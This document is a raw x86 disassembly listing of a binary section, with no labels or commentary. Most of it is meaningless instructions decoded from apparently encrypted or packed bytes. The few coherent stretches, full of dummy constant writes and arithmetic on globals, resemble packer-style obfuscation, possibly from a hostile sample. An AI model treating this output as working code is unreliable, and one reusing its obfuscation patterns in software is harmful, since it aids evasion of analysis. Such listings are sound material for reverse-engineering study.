  409892:	xchg   ebx,eax
  409893:	out    dx,eax
  409894:	hlt    
  409895:	and    esi,DWORD PTR [edx+0x75]
  409898:	call   edx
  40989a:	adc    eax,0x5ca482c9
  40989f:	ficomp DWORD PTR [eax]
  4098a1:	out    0x1d,al
  4098a3:	lods   eax,DWORD PTR ds:[esi]
  4098a4:	mov    cs,WORD PTR [esi-0x7d944b2c]
  4098aa:	mov    dh,0xa7
  4098ac:	out    0xc2,al
  4098ae:	cdq    
  4098af:	leave  
  4098b0:	test   BYTE PTR [edi-0x69],al
  4098b3:	in     al,0xaf
  4098b5:	scas   eax,DWORD PTR es:[edi]
  4098b6:	nop
  4098b7:	mov    esi,gs
  4098b9:	inc    ebx
  4098ba:	dec    edi
  4098bb:	and    ebx,ecx
  4098bd:	sahf   
  4098be:	sub    si,dx
  4098c1:	mov    bh,cl
  4098c3:	xchg   edx,eax
  4098c4:	push   ebp
  4098c5:	fimul  DWORD PTR [ebx]
  4098c7:	xchg   ebp,eax
  4098c8:	xchg   BYTE PTR [ecx+0x2c],cl
  4098cb:	sahf   
  4098cc:	xor    ah,BYTE PTR [ebx+0xc]
  4098cf:	shl    DWORD PTR [ecx-0x12d54520],cl
  4098d5:	(bad)  
  4098d6:	cmp    eax,0xd99b212d
  4098db:	aad    0xf5
  4098dd:	call   0x254e8a9f
  4098e2:	aaa    
  4098e3:	loope  0x40986e
  4098e5:	pusha  
  4098e6:	mov    eax,ds:0x156d972
  4098eb:	cmp    BYTE PTR [ebp-0x36],0x3d
  4098ef:	sub    ebp,esi
  4098f1:	push   ecx
  4098f2:	in     eax,dx
  4098f3:	xchg   edx,eax
  4098f4:	int3   
  4098f5:	fisttp DWORD PTR [edi]
  4098f7:	xchg   ebx,eax
  4098f8:	xchg   ebx,eax
  4098f9:	sbb    al,0x17
  4098fb:	pop    es
  4098fc:	mov    fs,WORD PTR [eax+0x2871c000]
  409902:	leave  
  409903:	xor    esp,edx
  409905:	out    dx,al
  409906:	jle    0x4098a8
  409908:	scas   al,BYTE PTR es:[edi]
  409909:	sub    edx,DWORD PTR [esi-0x1f46c7a8]
  40990f:	jns    0x409893
  409911:	(bad)  
  409912:	mov    bl,0x81
  409914:	pusha  
  409915:	adc    DWORD PTR [eax],esp
  409917:	xchg   ebx,eax
  409918:	cwde   
  409919:	mov    edi,0x7d638f7c
  40991e:	pop    es
  40991f:	retf   
  409920:	cmp    ebx,edi
  409922:	pop    edi
  409923:	xor    ebp,DWORD PTR [ebx+0x38386ec8]
  409929:	in     al,0xdb
  40992b:	out    dx,al
  40992c:	mov    al,0x77
  40992e:	mov    edx,0x83ab7cef
  409933:	(bad)  
  409934:	fisubr DWORD PTR [ecx-0x13]
  409937:	aas    
  409938:	ins    DWORD PTR es:[edi],dx
  409939:	add    BYTE PTR [edx],0xe5
  40993c:	test   BYTE PTR [edx-0x21],0x90
  409940:	xchg   ebp,eax
  409941:	scas   al,BYTE PTR es:[edi]
  409942:	fdiv   QWORD PTR [edx]
  409944:	mov    al,0x84
  409946:	adc    ebx,DWORD PTR ds:0x3e5ed267
  40994c:	mov    bh,0xf3
  40994e:	xor    al,0x15
  409950:	loop   0x40992b
  409952:	ret    0x411d
  409955:	mov    eax,0x26205ab3
  40995a:	dec    esi
  40995b:	stos   DWORD PTR es:[edi],eax
  40995c:	stc    
  40995d:	rcr    DWORD PTR [ebp-0x4d],1
  409960:	idiv   DWORD PTR [eax]
  409962:	cmp    BYTE PTR [ecx+eiz*4-0x6c3e5ec1],dl
  409969:	push   ss
  40996a:	jge    0x40995f
  40996c:	cmp    ebp,DWORD PTR [edx+eax*2+0x67]
  409970:	(bad)  
  409971:	mov    esp,0x6cd5d8b
  409976:	outs   dx,DWORD PTR ds:[esi]
  409977:	gs ins DWORD PTR es:[edi],dx
  409979:	inc    edx
  40997a:	(bad)  
  40997b:	rcr    DWORD PTR [edx+0x21d80eda],1
  409981:	xor    BYTE PTR [edx-0x4a65baca],0x1f
  409988:	sub    DWORD PTR [ebp+esi*2-0x153c1fde],ebp
  40998f:	lea    esi,[esi]
  409991:	test   eax,0x2b088f8d
  409996:	dec    esi
  409997:	xchg   esi,eax
  409998:	pop    ss
  409999:	test   al,0x46
  40999b:	loope  0x4099d8
  40999d:	jmp    0x187e242b
  4099a2:	sub    eax,0xf540f027
  4099a7:	outs   dx,BYTE PTR ds:[esi]
  4099a8:	or     eax,0x939cc627
  4099ad:	cmp    eax,0x5c0714b9
  4099b2:	inc    edx
  4099b3:	xlat   BYTE PTR ds:[ebx]
  4099b4:	mov    al,ds:0x4ec7118d
  4099b9:	xor    eax,DWORD PTR ds:0xe9961c93
  4099bf:	nop
  4099c0:	xor    eax,0x50301dbf
  4099c5:	push   ecx
  4099c6:	mov    DWORD PTR ds:0x42aad5,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42aae5,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42aad5,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42aa59,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a9d9
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x1fec14cf]
  409a19:	idiv   BYTE PTR es:[esi+esi*4]
  409a1d:	idiv   DWORD PTR [eax+0x78]
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099c3
  409a25:	das    
  409a26:	add    eax,0x464fd78e
  409a2b:	add    ch,BYTE PTR [eax+edi*8]
  409a2e:	loope  0x409a94
  409a30:	push   edx
  409a31:	jno    0x4099b9
  409a33:	push   ss
  409a34:	xchg   edi,eax
  409a35:	fs mov bh,0x3f
  409a38:	jp     0x409a2f
  409a3a:	mov    ebp,0xfad04a7b
  409a3f:	sub    DWORD PTR [esi],ebx
  409a41:	push   0xffffff88
  409a43:	pop    ebx
  409a44:	mov    esi,0x5674cc5d
  409a49:	adc    eax,0x2d7cc83
  409a4e:	sub    ah,BYTE PTR [edi-0x2e]
  409a51:	fsub   DWORD PTR ds:0x16799e4b
  409a57:	scas   al,BYTE PTR es:[edi]
  409a58:	test   eax,0x3ab8996b
  409a5d:	and    esp,DWORD PTR [edi-0x14cd4d4b]
  409a63:	mov    bl,0xbd
  409a65:	cwde   
  409a66:	cmp    al,0x82
  409a68:	push   ecx
  409a69:	ret    0x8b4b
  409a6c:	mov    BYTE PTR [ebx-0x65ee9204],bh
  409a72:	jmp    0x9409:0xd7e11c81
  409a79:	fisttp QWORD PTR [edi]
  409a7b:	sbb    dh,BYTE PTR [eax+ebp*1-0x251619d1]
  409a82:	(bad)  
  409a84:	jo     0x409a39
  409a86:	dec    eax
  409a87:	adc    ecx,DWORD PTR [eax-0x64]
  409a8a:	xchg   edi,eax
  409a8b:	jecxz  0x409b0a
  409a8d:	xor    al,0xec
  409a8f:	mov    esp,0x78fdb011
  409a94:	shr    al,1
  409a96:	inc    esp
  409a97:	pop    ds
  409a98:	inc    esp
  409a99:	add    BYTE PTR [eax-0x243a0343],ah
  409a9f:	jno    0x409b1d
  409aa1:	imul   ebx,DWORD PTR [ebx+0x4d0ab40c],0xffffffdf
  409aa8:	push   es
  409aa9:	addr16 gs mov bh,0x70
  409aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aae:	pop    ds
  409aaf:	fucomip st,st(5)
  409ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab2:	mov    eax,ds:0x6281b8c1
  409ab7:	scas   al,BYTE PTR es:[edi]
  409ab8:	cmc    
  409ab9:	jne    0x409ac3
  409abb:	adc    DWORD PTR [esi-0x684a2ade],esp
  409ac1:	call   0xf20b:0xd91bdd1a
  409ac8:	xlat   BYTE PTR ds:[ebx]
  409ac9:	stc    
  409aca:	jne    0x409ae8
  409acc:	daa    
  409acd:	sar    BYTE PTR [ebx+edx*8],0xf1
  409ad1:	jge    0x409a5f
  409ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ad4:	rcl    DWORD PTR [ebx-0x1d29572d],1
  409ada:	xchg   BYTE PTR [ebx-0x614544fe],bl
  409ae0:	data16 sub cl,BYTE PTR ds:0xf1c6a884
  409ae7:	cmp    dh,ch
  409ae9:	and    bl,BYTE PTR [ecx-0x79]
  409aec:	icebp  
  409aed:	jg     0x409aea
  409aef:	push   es
  409af0:	jl     0x409ab9
  409af2:	das    
  409af3:	(bad)  
  409af4:	xor    ebx,DWORD PTR [ebp+0x7e88848e]
  409afa:	in     eax,0xa7
  409afc:	xchg   ah,ch
  409afe:	jl     0x409af5
  409b00:	adc    al,0xc6
  409b02:	and    DWORD PTR [ecx+edi*2+0x5d],ebp
  409b06:	inc    edx
  409b07:	in     al,dx
  409b08:	dec    edi
  409b09:	fldenv [eax+ebx*4+0x47b5568d]
  409b10:	sub    edx,DWORD PTR [ebx+0x260f9c89]
  409b16:	xchg   DWORD PTR [esi+0x72],ecx
  409b19:	inc    esi
  409b1a:	sbb    al,0x9e
  409b1c:	jp     0x409b3f
  409b1e:	sub    eax,0x8ac768d2
  409b23:	out    0xb8,al
  409b25:	loop   0x409af7
  409b27:	or     BYTE PTR [edx+0x406b0a9f],cl
  409b2d:	stos   DWORD PTR es:[edi],eax
  409b2e:	fbstp  TBYTE PTR [ecx+0xd]
  409b31:	pushaw 
  409b33:	or     ecx,DWORD PTR [ebx+0x6a87ba05]
  409b39:	rcr    BYTE PTR [ebp-0x9e40464],1
  409b3f:	mov    esp,esp
  409b41:	es dec esi
  409b43:	pop    ecx
  409b44:	xor    al,0xba
  409b46:	lahf   
  409b47:	jg     0x409b4e
  409b49:	les    esp,FWORD PTR [ebx+0x3f]
  409b4c:	clc    
  409b4d:	dec    ecx
  409b4e:	sbb    BYTE PTR [ecx],ah
  409b50:	push   eax
  409b51:	push   ebx
  409b52:	xchg   ebx,eax
  409b53:	jl     0x409b80
  409b55:	out    0x38,eax
  409b57:	mov    ebx,0xa7a08573
  409b5c:	rol    BYTE PTR [ebx],0x7a
  409b5f:	(bad)  
  409b60:	fldlg2 
  409b62:	dec    edi
  409b63:	lods   eax,DWORD PTR ds:[esi]
  409b64:	inc    esp
  409b65:	xchg   edi,eax
  409b66:	shl    esp,1
  409b68:	cwde   
  409b69:	add    esi,DWORD PTR [esi+0x43]
  409b6c:	cdq    
  409b6d:	inc    esp
  409b6e:	bound  ebp,QWORD PTR [edi+0x484a5420]
  409b74:	std    
  409b75:	aas    
  409b76:	mov    ds:0x9f2f6ca5,al
  409b7b:	sbb    al,0x4d
  409b7d:	or     bh,BYTE PTR ds:0xba20fef0
  409b83:	push   ebp
  409b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b85:	in     al,dx
  409b86:	in     al,dx
  409b87:	(bad)  
  409b88:	(bad)  
  409b89:	pop    ebx
  409b8a:	mov    edi,ecx
  409b8c:	push   ss
  409b8d:	stc    
  409b8e:	ds mov esp,0x2f64cf81
  409b94:	dec    edi
  409b95:	clc    
  409b96:	fwait
  409b97:	mov    edi,0x2f2d9c64
  409b9c:	cmp    eax,0xa8873cef
  409ba1:	inc    esp
  409ba2:	aas    
  409ba3:	mov    ebx,ebx
  409ba5:	cli    
  409ba6:	jmp    0x765f:0x8355cc39
  409bad:	das    
  409bae:	std    
  409baf:	sbb    ecx,0xb5f67a0b
  409bb5:	jle    0x409b66
  409bb7:	xor    al,BYTE PTR [eax+edx*2-0x2488150]
  409bbe:	adc    eax,0x5d2456ec
  409bc3:	jo     0x409be9
  409bc5:	sub    eax,eax
  409bc7:	cli    
  409bc8:	mov    bl,0x3b
  409bca:	xchg   ch,ch
  409bcc:	xchg   esi,eax
  409bcd:	mov    bh,0xf
  409bcf:	fs jge 0x409bd4
  409bd2:	adc    al,BYTE PTR [eax]
  409bd4:	or     BYTE PTR [esi+0x59],ah
  409bd7:	add    al,0x4a
  409bd9:	int3   
  409bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bdb:	pusha  
  409bdc:	scas   eax,DWORD PTR es:[edi]
  409bdd:	imul   ecx,DWORD PTR [esi],0x5f267423
  409be3:	add    ah,BYTE PTR [esi+0x54]
  409be6:	shr    DWORD PTR [edi],cl
  409be8:	inc    ecx
  409be9:	push   0x3130ce21
  409bee:	popf   
  409bef:	xor    BYTE PTR [ebx-0x38],0xb6
  409bf3:	mov    bl,0xd4
  409bf5:	jno    0x409c42
  409bf7:	mov    al,0xc5
  409bf9:	xchg   edx,eax
  409bfa:	shl    DWORD PTR [esi+edx*8+0x598bb40d],0x7e
  409c02:	push   ss
  409c03:	inc    eax
  409c04:	ds jo  0x409c60
  409c07:	sbb    DWORD PTR [eax+edi*2+0x29],edx
  409c0b:	pop    esp
  409c0c:	jns    0x409c65
  409c0e:	xchg   ebx,eax
  409c0f:	imul   esp,DWORD PTR [esi-0x29],0xffffffe9
  409c13:	out    0x64,eax
  409c15:	int3   
  409c16:	fcmovbe st,st(6)
  409c18:	adc    ecx,DWORD PTR [edi-0x2423cff7]
  409c1e:	scas   eax,DWORD PTR es:[edi]
  409c1f:	outs   dx,DWORD PTR ds:[esi]
  409c20:	or     eax,edx
  409c22:	adc    DWORD PTR [ebx+0x4c30a415],esi
  409c28:	cld    
  409c29:	and    BYTE PTR [eax-0x7e1e916d],ah
  409c2f:	imul   ebx,DWORD PTR [ecx],0x46d4cbf8
  409c35:	inc    edi
  409c36:	pop    ebx
  409c37:	xor    BYTE PTR [eax+0x4aae97f],bl
  409c3d:	stos   DWORD PTR es:[edi],eax
  409c3e:	jmp    0x5914:0x92936d75
  409c45:	xor    DWORD PTR [ebp+0x301799b8],esp
  409c4b:	in     eax,0x6a
  409c4d:	jne    0x409c42
  409c4f:	in     eax,0xc6
  409c51:	stc    
  409c52:	call   0x8b98:0xc0a90684
  409c59:	and    eax,0xe148069c
  409c5e:	xchg   ecx,esp
  409c60:	xlat   BYTE PTR ds:[ebx]
  409c61:	pop    ebx
  409c62:	cmp    DWORD PTR [eax-0xc483f96],ecx
  409c68:	daa    
  409c69:	push   ecx
  409c6a:	enter  0xd242,0x3b
  409c6e:	pop    ss
  409c6f:	cmp    dh,BYTE PTR [edi+0x643630f1]
  409c75:	stos   BYTE PTR es:[edi],al
  409c76:	and    ah,BYTE PTR [edi+edx*2-0x5ed4e5e6]
  409c7d:	loop   0x409cc1
  409c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c80:	dec    edx
  409c81:	xchg   edx,eax
  409c82:	and    DWORD PTR [ebp-0x158b5baa],0x7b195ee9
  409c8c:	push   edx
  409c8d:	rcr    BYTE PTR [edx-0x64fb5dde],1
  409c93:	fcomip st,st(5)
  409c95:	scas   eax,DWORD PTR es:[edi]
  409c96:	mov    esp,0xeef29a44
  409c9b:	sar    BYTE PTR [edx-0x4c],cl
  409c9e:	or     ch,BYTE PTR [edx+0x31]
  409ca1:	push   ss
  409ca2:	mov    dl,0x50
  409ca4:	enter  0xc21e,0xf2
  409ca8:	cli    
  409ca9:	(bad)  
  409caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cab:	jbe    0x409cd5
  409cad:	push   ebp
  409cae:	ja     0x409c91
  409cb0:	stos   BYTE PTR es:[edi],al
  409cb1:	or     DWORD PTR [eax+0x128a60c4],ebp
  409cb7:	lea    esp,[ebx]
  409cb9:	pop    ebx
  409cba:	adc    al,0x44
  409cbc:	inc    ecx
  409cbd:	xchg   esi,eax
  409cbe:	pop    ds
  409cbf:	xchg   ebx,ecx
  409cc1:	out    0xcd,al
  409cc3:	jae    0x409c4c
  409cc5:	retf   0x24f3
  409cc8:	or     al,0x8f
  409cca:	leave  
  409ccb:	aas    
  409ccc:	jl     0x409c4f
  409cce:	pmuludq mm7,mm2
  409cd1:	(bad)
  409cd4:	inc    esi
  409cd5:	test   eax,0xc0cad31b
  409cda:	pop    edx
  409cdb:	les    edi,FWORD PTR [ebx-0x3c8e0201]
  409ce1:	mov    al,0x56
  409ce3:	jge    0x409d5d
  409ce5:	repnz pop es
  409ce7:	outs   dx,BYTE PTR ds:[esi]
  409ce8:	or     esp,edx
  409cea:	fld    st(3)
  409cec:	inc    edi
  409ced:	shl    BYTE PTR [edx+0x3c],0x42
  409cf1:	daa    
  409cf2:	inc    esp
  409cf3:	popa   
  409cf4:	outs   dx,BYTE PTR ds:[esi]
  409cf5:	das    
  409cf6:	or     al,0xc8
  409cf8:	fnstcw WORD PTR [eax+0x66]
  409cfb:	mov    eax,DWORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a9d9,0x42aa65
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a9dd,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42aaa1,0x42aa9d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42aa91,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x79363e45],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d1a
  409d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d67:	xor    ch,bh
  409d69:	pop    es
  409d6a:	mov    ah,0x4a
  409d6c:	psubusb mm0,QWORD PTR [edx-0x4114aa72]
  409d73:	mov    ds:0x2794f444,eax
  409d78:	jmp    0x85a54aeb
  409d7d:	mov    dh,0x59
  409d7f:	inc    edi
  409d80:	and    al,0xaf
  409d82:	mov    bl,0x6
  409d84:	icebp  
  409d85:	lds    edx,FWORD PTR es:0x6080618f
  409d8c:	pop    ds
  409d8d:	mov    cl,0xff
  409d8f:	mov    WORD PTR [esi*2+0x5f456483],?
  409d96:	mov    cl,0xc3
  409d98:	cmp    eax,0xb526db5c
  409d9d:	loopne 0x409d94
  409d9f:	add    esi,DWORD PTR [ebx]
  409da1:	adc    ecx,DWORD PTR ds:0xdda26d20
  409da7:	pushf  
  409da8:	jbe    0x409dfd
  409daa:	jne    0x409d51
  409dac:	add    cl,BYTE PTR ds:0x889ff374
  409db2:	inc    esp
  409db3:	inc    esp
  409db4:	(bad)  [ebx-0x22]
  409db7:	cmc    
  409db8:	cwde   
  409db9:	fs cmp eax,0x70602e5d
  409dbf:	jge    0x409d92
  409dc1:	jno    0x409e29
  409dc3:	out    0x3b,al
  409dc5:	loop   0x409d93
  409dc7:	mov    cl,0xae
  409dc9:	and    ebp,ebp
  409dcb:	or     BYTE PTR [ecx+0x13],al
  409dce:	repz cs push eax
  409dd1:	scas   eax,DWORD PTR es:[edi]
  409dd2:	scas   eax,DWORD PTR es:[edi]
  409dd3:	inc    edx
  409dd4:	es push ecx
  409dd6:	xchg   edi,eax
  409dd7:	jbe    0x409e04
  409dd9:	push   ebx
  409dda:	push   ss
  409ddb:	ins    BYTE PTR es:[edi],dx
  409ddc:	in     eax,dx
  409ddd:	inc    esi
  409dde:	ror    sp,cl
  409de1:	jmp    0xd24d:0xd45e240d
  409de8:	ins    BYTE PTR es:[edi],dx
  409de9:	adc    BYTE PTR [edx],al
  409deb:	sub    ebp,DWORD PTR [esi+0x49]
  409dee:	pushf  
  409def:	push   cs
  409df0:	aad    0x65
  409df2:	mov    ch,0xb3
  409df4:	ins    BYTE PTR es:[edi],dx
  409df5:	sti    
  409df6:	mov    ah,0xe0
  409df8:	cmc    
  409df9:	fs cld 
  409dfb:	sub    DWORD PTR [eax+0x3b],ebx
  409dfe:	fs sub al,cl
  409e01:	lea    edx,[esi+0x2009658f]
  409e07:	loopne 0x409e23
  409e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e0a:	adc    eax,0x1cd8c909
  409e0f:	or     DWORD PTR [edx],ebp
  409e11:	in     al,dx
  409e12:	mov    ebp,0x49865a19
  409e17:	and    eax,0xf0daa8ea
  409e1c:	inc    esp
  409e1d:	dec    esi
  409e1e:	test   eax,esp
  409e20:	and    ecx,DWORD PTR [ebx+edx*8+0x51323f30]
  409e27:	(bad)
  409e2a:	add    DWORD PTR [ebp+0x51940ead],0xffffffc0
  409e31:	push   ebx
  409e32:	addr16 in al,0x16
  409e35:	inc    ebp
  409e36:	add    dh,bl
  409e38:	cwde   
  409e39:	mov    ebp,0x91fc7d79
  409e3e:	pop    ebp
  409e3f:	push   cs
  409e40:	or     al,0xf
  409e42:	lds    esp,FWORD PTR [ebx]
  409e44:	jge    0x409e2e
  409e46:	pop    ebx
  409e47:	cdq    
  409e48:	icebp  
  409e49:	inc    esp
  409e4a:	inc    edx
  409e4b:	imul   ecx,DWORD PTR [ebx+0x74],0x1d
  409e4f:	cwde   
  409e50:	pop    ebx
  409e51:	add    ch,BYTE PTR [edi+ebx*8+0x5e8789dc]
  409e58:	adc    DWORD PTR [eax+0xa],0xfb0edea9
  409e5f:	jle    0x409ded
  409e61:	xor    bl,BYTE PTR [edx]
  409e63:	cmp    ch,BYTE PTR [esp+eax*2+0x5614c6d6]
  409e6a:	and    eax,DWORD PTR ds:0x37a
  409e6f:	and    eax,0xbe1ab140
  409e74:	inc    ecx
  409e75:	inc    edi
  409e76:	popa   
  409e77:	inc    esp
  409e78:	fist   DWORD PTR [edi]
  409e7a:	imul   ebp,DWORD PTR [ebp+0xf],0xffffffd7
  409e7e:	ss xchg ebp,eax
  409e80:	adc    cl,ah
  409e82:	xchg   BYTE PTR [edx-0x79],bh
  409e85:	jg     0x409e24
  409e87:	cmp    bh,BYTE PTR [ebp+0x6f]
  409e8a:	lods   eax,DWORD PTR ds:[si]
  409e8c:	mov    ebx,0xe958f034
  409e91:	dec    ebp
  409e92:	xchg   ebp,eax
  409e93:	in     al,dx
  409e94:	mov    esp,0xdad1e8c5
  409e99:	ficom  DWORD PTR ds:0x8ff5583c
  409e9f:	mov    ecx,0xd1bb86e5
  409ea4:	push   ds
  409ea5:	pop    esp
  409ea6:	push   edi
  409ea7:	nop
  409ea8:	and    al,0xa1
  409eaa:	pop    ecx
  409eab:	adc    esi,DWORD PTR [edi]
  409ead:	(bad)  
  409eae:	pushf  
  409eaf:	stc    
  409eb0:	mov    edi,0xe4d46939
  409eb5:	test   BYTE PTR [eax+0x20ecdf04],dh
  409ebb:	pop    edx
  409ebc:	sub    bl,BYTE PTR [esi]
  409ebe:	js     0x409e7b
  409ec0:	shl    DWORD PTR ds:0x786f2dce,1
  409ec6:	mov    ecx,0x8ca66ddc
  409ecb:	inc    esp
  409ecc:	call   FWORD PTR [ebx-0x49]
  409ecf:	xchg   ebp,eax
  409ed0:	scas   al,BYTE PTR es:[edi]
  409ed1:	or     ebx,DWORD PTR [ebx]
  409ed3:	push   es
  409ed4:	aaa    
  409ed5:	or     ebx,eax
  409ed7:	popa   
  409ed8:	or     bh,dl
  409eda:	aad    0x43
  409edc:	leave  
  409edd:	inc    DWORD PTR [edx]
  409edf:	mov    ds:0x162017f9,eax
  409ee4:	inc    BYTE PTR [edx-0x5c]
  409ee7:	push   ds
  409ee8:	cli    
  409ee9:	aad    0xa
  409eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eed:	pop    ecx
  409eee:	(bad)  
  409eef:	hlt    
  409ef0:	mov    ch,0xd2
  409ef2:	in     al,dx
  409ef3:	fimul  DWORD PTR ds:0x80d3af0
  409ef9:	jg     0x409ec5
  409efb:	inc    ecx
  409efc:	popf   
  409efd:	and    eax,DWORD PTR [ebp-0x61a81f09]
  409f03:	pop    ds
  409f04:	mov    ds:0x4391b1b2,al
  409f09:	lods   eax,DWORD PTR ds:[esi]
  409f0a:	fild   DWORD PTR [ecx-0x3dd2d4f5]
  409f10:	inc    ecx
  409f11:	fsubr  DWORD PTR [esi+0xf3191b7]
  409f17:	repz xor al,0x99
  409f1a:	xchg   DWORD PTR [ecx-0x2004a009],eax
  409f20:	jbe    0x409f90
  409f22:	fstp   QWORD PTR [edx-0x66d379b3]
  409f28:	adc    DWORD PTR [eax],eax
  409f2a:	lods   eax,DWORD PTR ds:[esi]
  409f2b:	pop    ebx
  409f2c:	imul   ecx,DWORD PTR fs:0xb291eb04,0x6caf19af
  409f37:	(bad)  
  409f38:	push   0x8ec90ed9
  409f3d:	dec    bp
  409f3f:	(bad)  
  409f40:	imul   esi,DWORD PTR [ebx],0x380db20
  409f46:	cmp    eax,DWORD PTR [esi-0x5a]
  409f49:	mov    WORD PTR ds:0xf22c9de,?
  409f4f:	xlat   BYTE PTR ds:[ebx]
  409f50:	and    al,0x3e
  409f52:	hlt    
  409f53:	add    eax,0xc560ce2a
  409f58:	jmp    0x3ec8:0xd23a53a6
  409f5f:	repz mov ah,0x9
  409f62:	rdtsc  
  409f64:	es dec esp
  409f66:	inc    esi
  409f67:	rol    bl,1
  409f69:	jns    0x409eec
  409f6b:	mov    esp,0x5772a537
  409f70:	aas    
  409f71:	lahf   
  409f72:	jb     0x409fdc
  409f74:	cwde   
  409f75:	ds test al,0x52
  409f78:	mov    cr0,eax
  409f7b:	mov    edx,0xe16366b1
  409f80:	and    eax,0x27ea6d8f
  409f85:	pushf  
  409f86:	test   eax,0xb4ec16e6
  409f8b:	into   
  409f8c:	leave  
  409f8d:	nop
  409f8e:	cmp    eax,0x6b89121f
  409f93:	out    dx,al
  409f94:	(bad)  
  409f95:	stos   BYTE PTR es:[edi],al
  409f96:	jne    0x409fc1
  409f98:	(bad)
  409f9d:	stos   BYTE PTR es:[edi],al
  409f9e:	dec    edi
  409f9f:	adc    DWORD PTR [edi-0x4e],0x94573012
  409fa6:	ja     0x409f2a
  409fa8:	add    BYTE PTR [eax+0x70791171],ch
  409fae:	ja     0x40a009
  409fb0:	jno    0x409fb4
  409fb2:	call   0xede6acdc
  409fb7:	push   ebp
  409fb8:	mov    DWORD PTR [edi-0x453d4296],0x373385c1
  409fc2:	and    ah,BYTE PTR [ecx]
  409fc4:	mov    ebp,0x1c393c88
  409fc9:	mov    bh,0xef
  409fcb:	mov    edi,0xbf115b6
  409fd0:	cmp    eax,0x5dfb108e
  409fd5:	sub    eax,0x759e3d55
  409fda:	cmp    DWORD PTR [edi],edi
  409fdc:	out    0x31,al
  409fde:	jno    0x40a01e
  409fe0:	(bad)  
  409fe1:	mov    esp,0xbc3f0074
  409fe6:	mov    ecx,0xfcfce3dc
  409feb:	mov    ah,0x80
  409fed:	cdq    
  409fee:	fild   WORD PTR [esi-0x6a2d58aa]
  409ff4:	mov    ch,0xd
  409ff6:	sbb    al,0xdd
  409ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff9:	inc    esi
  409ffa:	pop    esi
  409ffb:	mov    ds,WORD PTR [ecx+0x71]
  409ffe:	adc    DWORD PTR [esi],edx
  40a000:	mov    esp,DWORD PTR [ebp+0x3d]
  40a003:	xor    BYTE PTR [ecx+0x8911060],0x30
  40a00a:	fucomip st,st(5)
  40a00c:	add    ah,ch
  40a00e:	int3   
  40a00f:	jmp    0x1880:0x78743342
  40a016:	or     ebp,DWORD PTR [esi]
  40a018:	repz neg BYTE PTR [ebp+0x420deea1]
  40a01f:	pop    eax
  40a020:	jbe    0x40a02c
  40a022:	dec    esi
  40a023:	repz sbb esi,ecx
  40a026:	cli    
  40a027:	mov    WORD PTR [ecx],ds
  40a029:	xlat   BYTE PTR ds:[ebx]
  40a02a:	add    bh,ch
  40a02c:	mov    al,0x16
  40a02e:	push   ebp
  40a02f:	jmp    0xa5fd:0x6d48eb76
  40a036:	mov    edi,0x446a2fe6
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a9c5,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a9c5
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a9c5,eax
  40a084:	cmp    DWORD PTR ds:0x42a9c5,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a9c5,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42aad1,0x0
